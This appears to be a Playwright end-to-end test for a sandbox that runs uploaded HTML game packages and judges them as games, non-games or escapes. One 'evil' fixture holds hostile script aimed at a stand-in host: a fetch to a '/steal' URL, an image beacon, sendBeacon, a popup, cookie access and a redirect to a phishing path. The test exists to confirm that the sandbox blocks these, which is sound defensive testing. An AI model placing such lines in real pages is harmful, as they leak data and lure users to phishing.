// Run: PLAYWRIGHT=<path to playwright module> node tests/e2e-frame.mjs
// Starts a static server on :4181, loads tests/harness.html in Chromium, and checks the sandbox frame.
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { extname, join, normalize } from 'node:path';
import { fileURLToPath } from 'node:url';
import assert from 'node:assert/strict';

const root = join(fileURLToPath(import.meta.url), '..', '..');
const { chromium } = await import(process.env.PLAYWRIGHT || 'playwright');
const types = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml' };
const server = http.createServer(async (req, res) => {
  try { const p = normalize(decodeURIComponent(req.url.split('?')[0])); const b = await readFile(join(root, p)); res.writeHead(200, { 'content-type': types[extname(p)] || 'application/octet-stream' }); res.end(b); }
  catch { res.writeHead(404); res.end(); }
}).listen(4181);

const PNG = [...Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64')];
const GAME = `<!doctype html><canvas id=c width=200 height=150></canvas><script>
const x=document.getElementById('c').getContext('2d');let n=0,score=0,lives=3;
addEventListener('keydown',()=>{score++});function f(){n++;x.fillStyle='hsl('+(n*5%360)+',80%,50%)';x.fillRect(n%150,10,30,30);requestAnimationFrame(f)}f();</script>`;
const cases = {
  game: { files: { 'index.html': GAME }, check: r => { assert.equal(r.judged.result, 'game', JSON.stringify(r.judged.checks)); } },
  multifile: {
    files: {
      'index.html': `<!doctype html><link rel=stylesheet href="css/s.css"><canvas id=c width=100 height=100></canvas><img id=im src="img/a.png"><script type=module src="js/main.js"></script>`,
      'css/s.css': `body{background:url(../img/a.png)} @import "more.css";`, 'css/more.css': 'canvas{outline:1px solid red}',
      'img/a.png': PNG, 'data/level.json': '{"n":42}',
      'js/main.js': `import {go} from './lib.js'; go();`,
      'js/lib.js': `export async function go(){const r=await fetch('../data/level.json');const j=await r.json();window.__lvl=j.n;
        const c=document.getElementById('c').getContext('2d');(function f(){c.fillRect(Math.random()*90,Math.random()*90,5,5);requestAnimationFrame(f)})();
        addEventListener('keydown',()=>{});parent.postMessage({lvl:j.n},'*');const i=new Image();i.src='img/a.png';i.onload=()=>{document.title='img-ok'}}`,
    },
    check: r => { assert.ok(r.probe.draws2d > 10, 'module + fetch + css should work: ' + JSON.stringify(r.probe)); assert.equal(r.probe.errors, 0, r.probe.firstError); },
  },
  evil: {
    files: { 'index.html': GAME + `<script>fetch('https://evil.example/steal?c='+1).catch(()=>{});new Image().src='https://evil.example/p.gif';
      navigator.sendBeacon('https://evil.example/b','x');window.open('https://evil.example');try{document.cookie}catch(e){}
      setTimeout(()=>{location.href='https://evil.example/phish'},2000)</script>` },
    check: r => { assert.ok(r.probe.blocked.length >= 2, 'blocked list: ' + JSON.stringify(r.probe.blocked)); assert.ok(r.probe.popups >= 1); assert.ok(r.navigated || r.probe.navigated, 'navigation should be seen'); assert.equal(r.judged.result, 'escape'); },
  },
  notgame: { files: { 'index.html': '<!doctype html><h1>Hello</h1><p>Just a page.</p>' }, check: r => { assert.equal(r.judged.result, 'notgame'); } },
  storage: {
    files: { 'index.html': GAME + `<script>localStorage.setItem('hi','1');parent.postMessage({ok:localStorage.getItem('hi')},'*')</script>` },
    check: r => { assert.ok(r.probe.storageWrites >= 1); },
  },
};

const browser = await chromium.launch();
let failed = 0;
for (const [name, c] of Object.entries(cases)) {
  const page = await browser.newPage();
  await page.goto('http://127.0.0.1:4181/tests/harness.html');
  const r = await page.evaluate(([files]) => window.runPackage(files, name === 'evil' ? 4200 : 3800), [c.files]);
  try { assert.ok(!r.fatal, 'fatal: ' + r.fatal); c.check(r); console.log('ok   ', name, r.judged && r.judged.result); }
  catch (e) { failed++; console.log('FAIL ', name, e.message.slice(0, 400)); }
  await page.close();
}
await browser.close(); server.close();
process.exit(failed ? 1 : 0);
